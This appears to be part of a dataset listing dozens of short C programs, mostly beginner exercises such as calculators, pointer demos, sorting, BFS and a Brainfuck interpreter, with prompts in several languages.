    "#include <stdio.h>\nint main(void) {\n  int dia1,dia2,h1,h2,m1,m2,s1,s2;\n  int total;\n  scanf(\"%d %d:%d:%d\", &dia1,&h1,&m1,&s1);\n  scanf(\"%d %d:%d:%d\", &dia2,&h2,&m2,&s2);\n  total=(dia2-dia1)*86400+(h2-h1)*3600+(m2-m1)*60+(s2-s1);\n  if(total<0){\n    printf(\"Data invalida!\\n\");\n  }else{\n    printf(\"%d dia(s)\\n\", total/86400);\n    total=total%86400;\n    printf(\"%d hora(s)\\n\", total/3600);\n    total=total%3600;\n    printf(\"%d minuto(s)\\n\", total/60);\n    total=total%60;\n    printf(\"%d segundo(s)\\n\", total);\n  }\n  return 0;\n}",
    "#include <stdio.h>\nvoid function() {\n    int var = 5;\n    static int static_var = 5;\n    printf(\"\\t[in function] var = %d\\n\", var);\n    printf(\"\\t[in function] static_var = %d\\n\", static_var);\n    var++;\n    static_var++;\n}\nint main() {\n    int i;\n    static int static_var = 1337;\n    for (i = 0; i < 5; i++) {\n        printf(\"[in main] static_var = %d\\n\", static_var);\n        function();\n    }\n}",
    "#include <stdio.h>\nint trial(int b, float a)\n{\nreturn 1;\n}\nint main()\n{\n int k=5;\n trial(k,k);\n long int z;\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n    int a;\n    double b;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u6574\u6570:\");\n    scanf(\"%d\",&a);\n    b = pow(a,5);\n    printf(\"%d\u76845\u6b21\u65b9\u7684\u503c\u662f:%.2f \\n\",a,b);\n}",
    "#include <stdio.h>\nint maxBul(int *diziP, int len)\n{\n    int max = diziP[0];\n    for (int i = 0; i < len; i++)\n    {\n        if (diziP[i] > max)\n        {\n            max = *(diziP + i);\n        }\n    }\n    return max;\n}\nint main()\n{\n    int dizi[5] = {1, 2, 16, 4, 5};\n    printf(\"dizinin ilk indeksinin adresi %d\\n\", &dizi);\n    printf(\"dizinin ilk indeksinin adresi %d\\n\\n\", &dizi[0]);\n    int *pDizi = dizi;\n    printf(\"deger: %d  adres:%u\\n\", *pDizi, pDizi);\n    printf(\"deger: %d  adres:%u\\n\", *(pDizi + 1), pDizi + 1);\n    printf(\"deger: %d  adres:%u\\n\", *(pDizi + 2), pDizi + 2);\n    printf(\"deger: %d  adres:%u\\n\", *(pDizi + 3), pDizi + 3);\n    printf(\"deger: %d  adres:%u\\n\\n\\n\", *(pDizi + 4), pDizi + 4);\n    printf(\"dizinin max elemeni:%d\", maxBul(pDizi, 5));\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    unsigned char i = 2;\n    for (; i <= 100; i += 2) {\n        printf(\"%d\\n\", i);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main(){\n int F1 = 0, F2 = 1, F3, n = 15;\n if(n == 2) printf (\"%d %d \", F1, F2);\n else{\n  printf(\"%d %d\", F1, F2);\n  do{\n   F3 = F1 + F2;\n   printf(\"%d \", F3);\n   F1 = F2;\n   F2 = F3;\n   n--;\n  }while(n > 2);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n1;\n    int total =0;\n    int cont = 0;\n    float media;\n    while(cont < 20)\n    {\n        printf(\"dige um numero:\");\n        scanf(\"%d\",&n1);\n        total =total + n1;\n        cont = cont + 1;\n    }\n    media = (total / 20);\n    printf(\"a media e de %f\",media);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n char **p;\n for (p = argv + argc - 1; p > argv; p--)\n  printf(\"%s \", *p);\n printf(\"\\n\");\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    char str[20] = \"Hello\";\n    char *const p=str;\n    *p='M';\n    printf(\"%s\\n\", str);\n    return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <errno.h>\n#include <string.h>\nint main(int argc, char **argv)\n{\n    char* cmd = \"/home/kutztown.edu/schwesin/bin/submit.py\";\n    int return_code = execvp(cmd, argv);\n    if (return_code == -1) {\n        printf(\"%d: %s\\n\", errno, strerror(errno));\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint a[20][20],q[20],vi[20],n,f=-1,r=-1;\n void bfs(int v)\n{\nint i;\nfor(i=0;i<n;i++)\n{\nif(a[v][i]!=0 && vi[i]==0)\n{\nr=r+1;\nq[r]=i;\nvi[i]=1;\nprintf(\"%d\",i);\n}\n}\nf=f+1;\nif(f<=r)\n{\nbfs(q[f]);\n}\n}\nint main()\n{\nint v,i,j;\nprintf(\"enter the number of vertices\");\nscanf(\"%d\",&n);\nfor(i=0;i<n;i++)\n{\nvi[i]=0;\n}\nprintf(\"enter graph data in matrix form\");\nfor(i=0;i<n;i++)\nfor(j=0;j<n;j++)\nscanf(\"%d\",&a[i][j]);\nprintf(\"enter the startin vertex\");\nscanf(\"%d\",&v);\nf=r=0;\nq[r]=v;\nprintf(\"bfs traversal is\");\nvi[v]=1;\nprintf(\"%d\",v);\nbfs(v);\nif(r!=n-1)\nprintf(\"bfs not possible\");\n}",
    "#include<stdio.h>\nint main()\n{\n  int sum = 0;\n  int i = 0;\n  for(i = 0;i <= 10; i++){\n    sum += i;\n  }\n  printf(\"Sum: %d\\n\",sum);\n  return 0;\n}",
    "#include<stdio.h>\n#include<limits.h>\nint bad_int_size_is_32() {\n return (long) 2147483647 == 2147483647L;\n}\nint main() {\n printf(\"%d\", bad_int_size_is_32());\n return 0;\n}",
    "#include<stdio.h>\nvoid toLower(char[]);\nint main()\n{\n    char test[] = \"EveRyThing 7o LOWer\";\n    toLower(test);\n    printf(\"Result: %s\\n\", test);\n}\nvoid toLower(char phrase[])\n{\n    int i;\n    for (i = 0; phrase[i] != '\\0'; ++i) {\n        phrase[i] = (phrase[i] >= 'A' && phrase[i] <= 'Z') ? (phrase[i] - 'A' + 'a') : phrase[i];\n    }\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[]) {\n  int sideA, sideB, sideC;\n  printf(\"Insert side A: \");\n  scanf(\"%d\", &sideA);\n  printf(\"Insert side B: \");\n  scanf(\"%d\", &sideB);\n  printf(\"Insert side C: \");\n  scanf(\"%d\", &sideC);\n  if (sideA > sideB + sideC || sideB > sideA + sideC || sideC > sideA + sideB) {\n    printf(\"Not a triangle\");\n    return 1;\n  }\n  if (sideA == sideB && sideB == sideC) {\n    printf(\"Equilateral triangle\");\n  } else if (sideA == sideB || sideA == sideC || sideB == sideC) {\n    printf(\"Isoceles triangle\");\n  } else {\n    printf(\"Scalene triangle\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint sum(int);\nint main(void)\n{\n    int input;\n    int total = 0;\n    scanf(\"%d\", &input);\n    for (int i = 1; i <= input; i++)\n        total += sum(i);\n    printf(\"%d\\n\", total);\n    return 0;\n}\nint sum(int input)\n{\n    static int result = 0;\n    result += input;\n    return result;\n}",
    "#include <stdio.h>\nint main(void){\n    int vitorias, derrotas, empates, jogos, pontosTotal, pontosGanhos;\n    printf(\"\\nDigite o numero de vitorias: \");\n    scanf(\"%d\", &vitorias);\n    printf(\"\\nDigite o numero de derrotas: \");\n    scanf(\"%d\", &derrotas);\n    printf(\"\\nDigite o numero de empates: \");\n    scanf(\"%d\", &empates);\n    jogos = vitorias + derrotas + empates;\n    pontosTotal = jogos * 3;\n    pontosGanhos = (vitorias * 3) + (empates * 1);\n    printf(\"\\n\\nNumero de jogos: %d\", jogos);\n    printf(\"\\nQuantidade de pontos disputados: %d\", pontosTotal);\n    printf(\"\\nPontos ganhos: %d\", pontosGanhos);\n    printf(\"\\nPontos perdidos: %d\\n\\n\", (pontosTotal - pontosGanhos));\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    double a,b,c,delta,x1;\n    printf(\"oii\");\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int a[5][5],i,j,s,mx,mn;\n for (i=0;i<5;i++)\n {\n  printf(\"Enter grades for student %d:\\n\",i+1);\n  for (j=0;j<5;j++) scanf(\"%d\",&a[i][j]);\n }\n puts(\"Student Total Average\");\n for (i=0;i<5;i++)\n {\n  s=0;\n  for (j=0;j<5;j++) s+=a[i][j];\n  printf(\"%d%6d%6d\\n\",i+1,s,s/5);\n }\n puts(\"\\nQuiz Average High Low\");\n for (i=0;i<5;i++)\n {\n  s=0;mx=-1;mn=101;\n  for (j=0;j<5;j++)\n  {\n   s+=a[j][i];\n   if (mx<a[j][i]) mx=a[j][i];\n   if (mn>a[j][i]) mn=a[j][i];\n  }\n  printf(\"%d%6d%6d%6d\\n\",i+1,s/5,mx,mn);\n }\n return 0;\n}",
    "#include <stdio.h>\nint f1 (void)\n{\n  printf(\"%i\\n\", 1);\n  return 1;\n}\nint f2 (void)\n{\n  printf(\"%i\\n\", 2);\n  return 2;\n}\nint f3 (void)\n{\n  printf(\"%i\\n\", 3);\n  return 3;\n}\nint f4 (void)\n{\n  printf(\"%i\\n\", 4);\n  return 4;\n}\nint f5 (void)\n{\n  printf(\"%i\\n\", 5);\n  return 5;\n}\nint f6 (void)\n{\n  printf(\"%i\\n\", 6);\n  return 6;\n}\nint f7 (void)\n{\n  printf(\"%i\\n\", 7);\n  return 7;\n}\nint f8 (void)\n{\n  printf(\"%i\\n\", 8);\n  return 8;\n}\nint f9 (void)\n{\n  printf(\"%i\\n\", 9);\n  return 9;\n}\ntypedef void(*void_fp)(void);\ntypedef int(*int_fp)(void);\nconst int_fp fp_all[] = {f1, f2 ,f3, f4, f5 ,f6, f7, f8, f9};\nvoid(* const fp_tbl[3])(void) =\n{\n  (void(*)())f2,\n  (void(*)())f3,\n  (void(*)())f4,\n};\nvoid func(int i)\n{\n  const void_fp fp = fp_tbl[i];\n  fp();\n}\nint main()\n{\n  for(int i=0;i<3;i++)\n  {\n    func(i);\n  }\n  return 0;\n}",
    "#include<stdio.h>\nint main(void) {\n int va;\n puts(\"1\u304b\u308912\u307e\u3067\u306e\u6574\u6570\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\\n2016\u5e74\u306e\u305d\u306e\u6708\u306e\u795d\u65e5\u306e\u6570\u3092\u8fd4\u3057\u307e\u3059\u3002\");\n do {\n  printf(\"\u6708 : \");\n  scanf(\"%d\", &va);\n  if (va <= 0 || va > 12)\n   printf(\"\u5165\u529b\u3055\u308c\u305f\u6570\u5024 %d \u306f\u7121\u52b9\u3067\u3059\u3002\\n1\u304b\u308912\u307e\u3067\u306e\u6574\u6570\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\\n\", va);\n } while (va <= 0 || va > 12);\n switch (va) {\n case 1:\n  puts(\"1\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e8c\u3064\u3067\u3059\u3002\");\n  break;\n case 2:\n  puts(\"2\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e00\u3064\u3067\u3059\u3002\");\n  break;\n case 3:\n  puts(\"3\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e8c\u3064\u3067\u3059\u3002\");\n  break;\n case 4:\n  puts(\"4\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e00\u3064\u3067\u3059\u3002\");\n  break;\n case 5:\n  puts(\"5\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e09\u3064\u3067\u3059\u3002\");\n  break;\n case 6:\n  puts(\"6\u6708\u306e\u795d\u65e5\u306f\u3042\u308a\u307e\u305b\u3093\u3002\");\n  break;\n case 7:\n  puts(\"7\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e00\u3064\u3067\u3059\u3002\");\n  break;\n case 8:\n  puts(\"8\u6708\u306e\u795d\u65e5\u306f\u3042\u308a\u307e\u305b\u3093\u3002\");\n  break;\n case 9:\n  puts(\"9\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e8c\u3064\u3067\u3059\u3002\");\n  break;\n case 10:\n  puts(\"10\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e00\u3064\u3067\u3059\u3002\");\n  break;\n case 11:\n  puts(\"11\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e8c\u3064\u3067\u3059\u3002\");\n  break;\n case 12:\n  puts(\"12\u6708\u306e\u795d\u65e5\u306e\u6570\u306f\u4e00\u3064\u3067\u3059\u3002\");\n  break;\n }\n return 0;\n}",
    "#include <stdio.h>\nint potencia(int k, int n) {\n  if(n == 0) return 1;\n  return k * potencia(k,n-1);\n}\nint hiperfatorial(int n) {\n    if(n == 1) return potencia(n, n);\n    return potencia(n, n) * hiperfatorial(n-1);\n}\nint main() {\n    printf(\"O hiperfatorial de 4 eh: %d\" , hiperfatorial(4));\n    return 0;\n}",
    "int A[5] = {1, 2, 3, 4, 5};\nint main() {\n    int b = ++A[1];\n    return b + A[1];\n}",
    "#include <stdio.h>\nint push(int stack[], int size, int val){\n    stack[size] = val;\n    return size + 1;\n}\nint pop(int stack[], int *size){\n    return stack[--(*size)];\n}\nint main(){\n    int stack[10] = {0};\n    int size = 0;\n    size = push(stack, size, 1);\n    size = push(stack, size, 21);\n    size = push(stack, size, 33);\n    size = push(stack, size, 55);\n    for(int i = 0; i < size; i++){\n        printf(\"data : %d\\n\", stack[i]);\n    }\n    int popped = pop(stack, &size);\n    printf(\"Popped : %d\\n\", popped);\n    for(int i = 0; i < size; i++){\n        printf(\"data : %d\\n\", stack[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <string.h>\n#include <stdbool.h>\nvoid playGuessWord (char word[33]) {\n  int len = strlen(word) - 1;\n  char currentWord[len + 1];\n  for (int i = 0; i < len; i++) {\n    currentWord[i] = '_';\n  }\n  int guessedCount = 0;\n  int turnCounter = 1;\n  printf(\"Welcome to Word Guess! \\n\");\n  while (guessedCount < len) {\n    printf(\"Turn: %i\\n\", turnCounter++);\n    for (int i = 0; i < len; i++) {\n      printf(\"%c \", currentWord[i]);\n    }\n    printf(\"\\n\");\n    char input = 0;\n    printf(\"Guess a character: \");\n    scanf(\" %c\", &input);\n    printf(\"\\n\");\n    _Bool found = 0;\n    for (int i = 0; i < len; i++) {\n      if (word[i] == input) {\n        found = 1;\n        if (currentWord[i] == '_') {\n          currentWord[i] = input;\n          guessedCount++;\n        }\n      }\n    }\n    if (!found) {\n      printf(\"Sorry, %c not found!\\n\\n\", input);\n    }\n  }\n  for (int i = 0; i < len; i++) {\n    printf(\"%c \", currentWord[i]);\n  }\n  printf(\"\\n\");\n  printf(\"You won in %d turns!\\n\", (turnCounter-1));\n}\nint main() {\n  FILE* infile = ((void*)0);\n  infile = fopen(\"words.txt\", \"r\");\n  if (infile == ((void*)0)) {\n    printf(\"Error: unable to open file\");\n    exit(1);\n  }\n  char buffer[33];\n  fgets(buffer, 33, infile);\n  int numWords = atoi(buffer);\n  srand(time(0));\n  int wordIndex = rand() % numWords;;\n  int index = 0;\n  while (fgets(buffer, 33, infile) != ((void*)0) && index < wordIndex) {\n    index++;\n  }\n  playGuessWord(buffer);\n  fclose(infile);\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n    unsigned char s[101];\n    scanf(\"%s\", s);\n    for(unsigned char i = 0; s[i] != 0; i++)\n        printf(\"%c\", s[i] + 1);\n    return 0;\n}",
    "#include <threads.h>\n#include <stdio.h>\nonce_flag flag = 0;\nvoid doOnce(void) { puts(\"Function doOnce().\"); }\nint th_func(void * arg)\n{\n    puts((char*)arg);\n    call_once(&flag, doOnce);\n    return 0;\n}\nint main()\n{\n    thrd_t th1, th2, th3;\n    if( thrd_create(&th1, th_func, \"Thread 1\") != thrd_success\n        || thrd_create(&th2, th_func, \"Thread 2\") != thrd_success\n        || thrd_create(&th3, th_func, \"Thread 3\") != thrd_success)\n    {\n        fprintf((stderr), \"Error creating thread.\\n\");\n        return 0xff;\n    }\n    puts(\"Hello ...\");\n    thrd_join(th1, ((void*)0));\n    thrd_join(th2, ((void*)0));\n    thrd_join(th3, ((void*)0));\n    return 0;\n}",
    "#include <stdio.h>\nunion a_union {\n  int i;\n  double d;\n};\nint main() {\n  double d = 3.1415;\n  int j = ((union a_union * ) &d)->i;\n  printf(\"j=%d\\n\",j);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int number1, number2, number3, number4, number5, number6;\n    int total = 0;\n    printf(\"Digite um n\u00famero: \");\n    scanf(\"%d\", &number1);\n    printf(\"Digite um n\u00famero: \");\n    scanf(\"%d\", &number2);\n    printf(\"Digite um n\u00famero: \");\n    scanf(\"%d\", &number3);\n    printf(\"Digite um n\u00famero: \");\n    scanf(\"%d\", &number4);\n    printf(\"Digite um n\u00famero: \");\n    scanf(\"%d\", &number5);\n    printf(\"Digite um n\u00famero: \");\n    scanf(\"%d\", &number6);\n    if(number1 % 2 == 0) {\n        total += number1;\n    }\n    if(number2 % 2 == 0) {\n        total += number2;\n    }\n    if(number3 % 2 == 0) {\n        total += number3;\n    }\n    if(number4 % 2 == 0) {\n        total += number4;\n    }\n    if(number5 % 2 == 0) {\n        total += number5;\n    }\n    if(number6 % 2 == 0) {\n        total += number6;\n    }\n    printf(\"Soma dos n\u00fameros pares: %d\", total);\n    return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n  int i, j, e, f, num, t, c, r;\n  char n[200][200];\n  while(scanf(\"%d\\n\" , &num) != 0)\n  {\n    if(num == 0)\n      break;\n    for(i = 0; i < num; i ++)\n      fgets(n[i], 199, (stdin));\n    f = 0;\n    for(i = 0; i < num; i ++)\n    {\n      t = 0;\n      for(j = 0; j < num * 2; j += 2)\n        t = t + n[i][j] - '0';\n      if(t % 2 == 1)\n      {\n        f ++;\n        if(f > 1)\n          break;\n        else\n          c = i + 1;\n      }\n    }\n    if(f < 2)\n    {\n      e = 0;\n      for(j = 0; j < num * 2; j += 2)\n      {\n        t = 0;\n        for(i = 0; i < num; i ++)\n          t = t + n[i][j] - '0';\n        if(t % 2 == 1)\n        {\n          e ++;\n          if(e > 1)\n            break;\n          else\n            r = j / 2 + 1;\n        }\n      }\n    }\n    if(f == 0 && e == 0)\n      printf(\"OK\\n\");\n    else if(f == 1 && e == 1)\n      printf(\"Change bit (%d,%d)\\n\" , c, r);\n    else\n      printf(\"Corrupt\\n\");\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main(){\n int num[5] = {10,20,30,40,50};\n int *ptr;\n int i;\n ptr = &num[0];\n for(i=0; i<5; i++){\n  printf(\"%d\\n\",*ptr);\n  ptr++;\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nfloat quadratic_calculation (float x);\nint main(void)\n{\n float input = 0.0;\n float output = 0.0;\n printf(\"This program evaluates x^2 + 5x + 6\\n\\n\");\n printf(\"*** Note: Invalid values will terminate the program  ***\\n\\n\");\n do\n {\n  printf(\"Enter a decimal value between -100.0 and 100.0 :\");\n  scanf(\"%f\",&input);\n  if(input > -100.0 && input < 100.0)\n  {\n   output = quadratic_calculation (input);\n   printf(\"f(%.4f) = %.4f\\n\\n\", input, output);\n  }else\n  {\n   printf(\"%.3f is invalid. Good bye\", input);\n  }\n }while(input > -100.0 && input < 100.0);\n return 0;\n}\nfloat quadratic_calculation (float x)\n{\n float result = 0.0;\n result = ((float) pow(x,2)) + 5*x + 6;\n return result;\n}",
    "#include <stdio.h>\nint a[2007],N;\nint dp[2007][2007];\nint dfs(int ,int,int);\nvoid read(void);\nint max(int,int);\nint main(void){\n read();\n int l,r;\n for(l=N-1;l>=0;--l)\n  for(r=l;r<N;++r){\n\n\n\n   dp[l][r]=max(dp[l+1][r]+a[l]*(N-r+l),dp[l][r-1]+a[r]*(N-r+l));\n  }\n printf(\"%d\\n\",dp[0][N-1]);\n}\nvoid read(void){\n int i;\n scanf(\"%d\",&N);\n for(i=0;i<N;++i) scanf(\"%d\",a+i);\n}\nint max(int a,int b){\n if(a>b) return a;\n return b;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(int argc, char* argv[]) {\n if(argc != 2) {\n  printf(\"Usage: %s (name of brainfuck program)\\n\", argv[0]);\n  return 1;\n }\n FILE* fp = fopen(argv[1], \"rb\");\n if(!fp) {\n  perror(argv[1]);\n  return 1;\n }\n fseek(fp, 0L, (2));\n long size = ftell(fp);\n rewind(fp);\n char* program = (char*)calloc(1, size + 1);\n if(!program) {\n  fclose(fp);\n  fputs(\"Memory allocation failed\\n\", (stderr));\n  return 1;\n }\n if(fread(program, size, 1, fp) != 1) {\n  fclose(fp);\n  free(program);\n  fputs(\"Read failed\\n\", (stderr));\n  return 1;\n }\n fclose(fp);\n unsigned char memory[65536] = {0};\n unsigned int progCounter = 0;\n unsigned short memPos = 0;\n while(progCounter < size) {\n  switch(program[progCounter]) {\n  case '+':\n   memory[memPos]++;\n   progCounter++;\n   break;\n  case '-':\n   memory[memPos]--;\n   progCounter++;\n   break;\n  case '>':\n   memPos++;\n   progCounter++;\n   break;\n  case '<':\n   memPos--;\n   progCounter++;\n   break;\n  case '.':\n   putchar(memory[memPos]);\n   progCounter++;\n   break;\n  case ',':\n   memory[memPos] = getchar();\n   progCounter++;\n   break;\n  case '[':\n   if(memory[memPos] == 0) {\n    int bracketCount = 0;\n    do {\n     if(program[progCounter] == '[')\n      bracketCount++;\n     else if(program[progCounter] == ']')\n      bracketCount--;\n     progCounter++;\n    } while(bracketCount);\n   } else {\n    progCounter++;\n   }\n   break;\n  case ']':\n   {\n    int bracketCount = 0;\n    do {\n     if(program[progCounter] == '[')\n      bracketCount++;\n     else if(program[progCounter] == ']')\n      bracketCount--;\n     progCounter--;\n    } while(bracketCount);\n   }\n   progCounter++;\n   break;\n  default:\n   progCounter++;\n   break;\n  }\n }\n free(program);\n return 0;\n}",
    "#include<stdio.h>\nint sumDigit(int);\nint sumDigit(int a)\n{\n    int sum=0;\n    while(a>0)\n    {\n        sum += a%10;\n        a /= 10;\n    }\n    return sum;\n}\nint main()\n{\n    int a=0;\n    printf(\"Enter a number to find sum of digits: \");\n    scanf(\"%d\",&a);\n    printf(\"Sum of digits = %d \",sumDigit(a));\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main( void )\n{\n   int frequency1 = 0;\n   int frequency2 = 0;\n   int frequency3 = 0;\n   int frequency4 = 0;\n   int frequency5 = 0;\n   int frequency6 = 0;\n   int roll;\n   int face;\n   for ( roll = 1; roll <= 6000; roll++ ) {\n      face = 1 + rand() % 6;\n      switch ( face ) {\n         case 1:\n            ++frequency1;\n            break;\n         case 2:\n            ++frequency2;\n            break;\n         case 3:\n            ++frequency3;\n            break;\n         case 4:\n            ++frequency4;\n            break;\n         case 5:\n            ++frequency5;\n            break;\n         case 6:\n            ++frequency6;\n            break;\n       }\n    }\n    printf( \"%s%13s\\n\", \"Face\", \"Frequency\" );\n    printf( \"   1%13d\\n\", frequency1 );\n    printf( \"   2%13d\\n\", frequency2 );\n    printf( \"   3%13d\\n\", frequency3 );\n    printf( \"   4%13d\\n\", frequency4 );\n    printf( \"   5%13d\\n\", frequency5 );\n    printf( \"   6%13d\\n\", frequency6 );\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv)\n{\n const int arr[] = {1, 2, 3, 4, 4, 5, 6};\n puts(\"Unique number sequence\");\n for (int i = 0; i < sizeof(arr) / sizeof(arr[0]); i++) {\n  printf(\"%d \", arr[i]);\n }\n puts(\"\\nThat's all what I got!\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char const *argv[]) {\n    unsigned a = 0;\n    unsigned b = 12;\n    while (a < b) {\n        a+=4;\n        b-=2;\n    }\n    unsigned c = rand();\n    if(a>6 && b<6){\n        switch (a) {\n            case 6:\n                b = 99;\n                break;\n            case 12:\n            case 13:\n                b = a*2;\n                break;\n            default:\n                c = c%18;\n        }\n    } else {\n        a = 88;\n    }\n    printf(\"%d\\n\", a);\n    printf(\"%d\\n\", b);\n    printf(\"%d\\n\", c);\n}",
    "#include <stdio.h>\nint numbers[3][5] = {{3,9,27,81,243},{4,16,64,256,1024},{5,25,125,625,3125}};\nint main(void) {\n    int i = 0;\nloop1:\n    if (i >= 3) goto end1;\n        int j = 0;\n    loop2:\n        if (j >= 5) goto end2;\n            printf(\"%d\", numbers[i][j]);\n            printf(\"%c\", ' ');\n            j++;\n        goto loop2;\n    end2:\n        printf(\"%c\", '\\n');\n        i++;\n    goto loop1;\nend1:\n    return 0;\n}",
    "#include <stdio.h>\nint get_input(char *prompt, int *x) {\n printf(\"%s\", prompt);\n if (scanf(\"%d\", x) == 0) {\n  printf(\"Value entered was not an integer.\\n\");\n  return 0;\n }\n return 1;\n}\nint main () {\n int input;\n get_input(\"Enter size: \", &input);\n int vert = 0;\n int depth = 0;\n while (vert < input) {\n  int hor = 0;\n  while (hor < input) {\n   if ((hor == depth) || ((input - hor - 1) == depth)) {\n    printf(\"*\");\n   } else {\n    printf(\"-\");\n   }\n   hor++;\n  }\n  printf(\"\\n\");\n  if ((input - (vert + 1)) > (input / 2)) {\n   depth++;\n  } else {\n   depth--;\n  }\n  vert++;\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(int argc, char** argv)\n{\n long double result = atof(argv[1]);\n for (int i = 2; i < argc; ++i)\n  result = pow(result, atof(argv[i]));\n printf(\"%Lf\\n\", result);\n return 0;\n}",
    "#include <stdio.h>\n\nconst int a[]={3,-1,2,4,-7,8};\nconst int n = 6;\n_Bool used[100];\nvoid Print()\n{\n    for(int i=0;i<n;++i)\n    {\n        if(used[i]) printf(\"%4d\",a[i]);\n    }\n    printf(\"\\n\");\n}\nvoid dfs(int *sum,int k,int step)\n{\n    if(step==n){\n        if(*sum==k) Print();\n    }else{\n        if(*sum==k){\n            Print();\n        }else{\n            if(!used[step]){\n                used[step]=1;\n                *sum=*sum+a[step];\n                dfs(sum,k,step+1);\n                *sum=*sum-a[step];\n                used[step]=0;\n            }\n        }\n    }\n}\nint main(int argc, char *argv[])\n{\n    int sum = 0;\n    int k;\n    scanf(\"%d\",&k);\n    dfs(&sum,k,0);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdint.h>\n\nint main(void)\n{\n uint8_t someData[10] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};\n printf(\"contents of array element\\n\");\n for(uint8_t i = 0; i < 10; i++)\n {\n  printf(\"%x\\t\", someData[i]);\n }\n someData[2] = 0x33;\n  printf(\"\\n\");\n   for(uint8_t i = 0; i < 10; i++)\n    {\n       printf(\"%x\\t\", someData[i]);\n    }\n  printf(\"\\n\");\n for(uint8_t i = 0; i < 10; i++)\n  {\n  someData[i] = 0x33;\n     printf(\"%x\\t\", someData[i]);\n  }\n return 0;\n}",
    "#include <stdio.h>\nvoid bubbleSort(int unsortedArray[], int length);\nvoid printArray(int array[], int length);\nvoid swap(int *bigger, int *smaller);\nint main(void)\n{\n    int unsortedArray[10] = {3,1,7,2,10,5,4,6,8,9};\n    bubbleSort(unsortedArray, 10);\n    int sortedArray[10] = {1,2,3,4,5,6,7,8,9,10};\n    bubbleSort(sortedArray, 10);\n}\nvoid bubbleSort(int array[], int length)\n{\n    int swapCounter = -1,\n        maxIndex = length,\n        iterations = 0;\n    while (swapCounter > 0 || swapCounter == -1)\n    {\n        swapCounter = 0;\n        for (int i = 0; i < (maxIndex-1); i++)\n        {\n            if (array[i] > array[i+1])\n            {\n                swap(&array[i], &array[i+1]);\n                swapCounter++;\n            }\n        }\n        maxIndex--;\n        iterations++;\n    }\n    printf(\"Iterations: %i\\n\", iterations);\n    printf(\"Sorted! \\n\");\n    printArray(array, length);\n}\nvoid swap(int *p1, int *p2)\n{\n    int bigger = *p1;\n    *p1 = *p2;\n    *p2 = bigger;\n}\nvoid printArray(int array[], int length)\n{\n    printf(\"[\");\n    for (int i = 0; i < length; i++)\n        printf(\" %i\", array[i]);\n    printf(\" ]\\n\");\n}",
    "char a[2] = \"\\\\\", g = (char)5;\nint intaga = 5;\nint main(void) {\n  return 0;\n}",
    "#include <stdbool.h>\n#include <stdio.h>\n#include <stdlib.h>\nint getDegrees(int initial, int first, int second, int third)\n{\n    int sum = 0;\n    sum += 360 * 2;\n    if (initial == first)\n    {\n        sum += 360;\n    } else\n    {\n        sum += ((initial - first + 40) % 40) * 9;\n    }\n    sum += 360;\n    if (first == second)\n    {\n        sum += 360;\n    } else\n    {\n        sum += ((second - first + 40) % 40) * 9;\n    }\n    if (second == third)\n    {\n        sum += 360;\n    } else\n    {\n        sum += ((second - third + 40) % 40) * 9;\n    }\n    return sum;\n}\nint main()\n{\n    int initial, first, second, third, result;\n    _Bool reachedEnd = 0;\n    scanf(\"%d %d %d %d\", &initial, &first, &second, &third);\n    result = getDegrees(initial, first, second, third);\n    printf(\"%d\", result);\n    reachedEnd = (initial == 0 && first == 0 && second == 0 && third == 0);\n    while (!reachedEnd)\n    {\n        scanf(\"%d %d %d %d\", &initial, &first, &second, &third);\n        result = getDegrees(initial, first, second, third);\n        printf(\"\\n%d\", result);\n        reachedEnd = (initial == 0 && first == 0 && second == 0 && third == 0);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int *p,*p1, x=10;\n p=&x;\n p1=&p;\n printf(\"x: %d\\n\",x);\n printf(\"&x: %d\\n\",&x);\n printf(\"p: %d\\n\",p);\n printf(\"*p: %d\\n\",*p);\n printf(\"&p: %d\\n\",&p);\n printf(\"p1: %d\\n\",p1);\n printf(\"*p1: %d\\n\",*p1);\n printf(\"&p1: %d\\n\",&p1);\n return 0;\n}",
